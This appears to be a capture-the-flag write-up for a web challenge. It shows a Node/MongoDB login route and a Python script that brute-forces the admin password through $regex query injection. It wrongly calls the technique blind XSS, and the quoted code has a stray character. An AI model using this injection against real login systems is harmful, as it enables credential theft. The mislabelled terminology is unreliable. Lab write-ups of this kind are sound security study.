# Write-up of the challenge "session-basic"

This challenge is part of the "Web" category and is level 2.

# Goal of the challenge

The objective of this challenge is to find the flag throught **blinds xss** attack.

## Program structure

```
const express = require('express');
const app = express();

const mongoose = require('mongoose');
mongoose.connect('mongodb://localhost/main', { useNewUrlParser: true, useUnifiedTopology: true });
const db = mongoose.connection;

// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
const BAN = ['admin', 'dh', 'admi'];

filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}

app.get('/login', function(req, res) {
    if(filter(req.query)){
        res.send('filter');
        return;
    }
    const {uid, upw} = req.query;

    db.collection('user').findOne({
        'uid': uid,
        'upw': upw,
    }, function(err, result){d
        if (err){
            res.send('err');
        }else if(result){
            res.send(result['uid']);
        }else{
            res.send('undefined');
        }
    })
});

app.get('/', function(req, res) {
    res.send('/login?uid=guest&upw=guest');
});

app.listen(8000, '0.0.0.0');


```

## Vulnerability

This is not doing any filtering for injections that means we can use **[$regex]** if we want.

```
  db.collection('user').findOne({
        'uid': uid,
        'upw': upw,
    },
```

## Solution

So what I realized first since they are banning these items **const BAN = ['admin', 'dh', 'admi'];**, that means we need another way to find the flag. The first thing that came to my mind because when we log in as **admin**, the admin text would be displayed. That means if we use **[$regex]** in mongodb then we can bruteforce throught digits and letters and find the flag. What we would be doing is just **blind xss**, where we bruteforce and we check if the letter/digit we added returns **admin**, that means that letter/digit is correct!

```
import requests, string

web = 'http://host8.dreamhack.games:19365/'

sym = string.digits + string.ascii_letters

flag = ''

for i in range(32):

    for c in sym:

        response = requests.get(f'{web}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{c}')

        if response.text == 'admin':

            flag += c

            break

    print(f'FLAG: DH{{{flag}}}')
```
